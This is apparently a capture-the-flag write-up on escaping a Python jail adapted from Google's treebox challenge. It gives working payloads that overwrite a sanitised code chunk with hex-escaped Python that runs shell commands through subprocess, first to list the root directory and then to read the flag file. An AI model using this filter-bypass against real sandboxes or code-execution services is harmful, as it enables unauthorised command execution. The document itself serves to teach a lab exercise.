In this challenge we need to solve a pyjail that looks very similar to another pyjail.
<!--more-->
From the very beginning, this pyjail hints that it was ripped from another CTF.

## Mind games

The challenge description comes with the notice:

> This jail was totally not made last minute (based on gctf treebox)

The title also hints that this was quickly put together.

Opening the file, we notice a copyright notice from Google in 2022.

```py
# Copyright 2022 Google LLC
...
# Flag is in a file called "flag" in cwd.
```

The rest of the code looks extremely similar except for 3 major differences:
- The AST is filtered on a whitelist rather than a blacklist
- The characters `@.()#` are banned
- The code is run in chunks delimited by `--CHUNK`

As you probably guessed by now, this challenge has nothing to do with previous challenges.

## The exploit

When we run `exec` we get access to the current context, so we could modify the code contained in the second chunk after it got sanitized.

## The code

We want to encode all our characters as hex to bypass the filters.

let's inject
```py
import subprocess;
p = subprocess.Popen("ls /", stdout=subprocess.PIPE, shell=True);
(output, err) = p.communicate();
print(output)
```

The code we give netcat is:

```
chunks[1] = "\x69\x6d\x70\x6f\x72\x74\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x3b\x70\x20\x3d\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x6f\x70\x65\x6e\x28\x22\x6c\x73\x20\x2f\x22\x2c\x20\x73\x74\x64\x6f\x75\x74\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x2c\x20\x73\x68\x65\x6c\x6c\x3d\x54\x72\x75\x65\x29\x3b\x28\x6f\x75\x74\x70\x75\x74\x2c\x20\x65\x72\x72\x29\x20\x3d\x20\x70\x2e\x63\x6f\x6d\x6d\x75\x6e\x69\x63\x61\x74\x65\x28\x29\x3b\x70\x72\x69\x6e\x74\x28\x6f\x75\x74\x70\x75\x74\x29"
--CHUNK
1 + 1
--END
```

We find that the flag is located in `/flag.poyvHVzi1MUB72nR0gly.txt`

Let's modify our injected code cat

```py
import subprocess;
p = subprocess.Popen("cat /flag.poyvHVzi1MUB72nR0gly.txt", stdout=subprocess.PIPE, shell=True);
(output, err) = p.communicate();
print(output)
```

The code we give netcat is:

```
chunks[1] = "\x69\x6d\x70\x6f\x72\x74\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x3b\x70\x20\x3d\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x70\x6f\x79\x76\x48\x56\x7a\x69\x31\x4d\x55\x42\x37\x32\x6e\x52\x30\x67\x6c\x79\x2e\x74\x78\x74\x22\x2c\x20\x73\x74\x64\x6f\x75\x74\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x2c\x20\x73\x68\x65\x6c\x6c\x3d\x54\x72\x75\x65\x29\x3b\x28\x6f\x75\x74\x70\x75\x74\x2c\x20\x65\x72\x72\x29\x20\x3d\x20\x70\x2e\x63\x6f\x6d\x6d\x75\x6e\x69\x63\x61\x74\x65\x28\x29\x3b\x70\x72\x69\x6e\x74\x28\x6f\x75\x74\x70\x75\x74\x29"
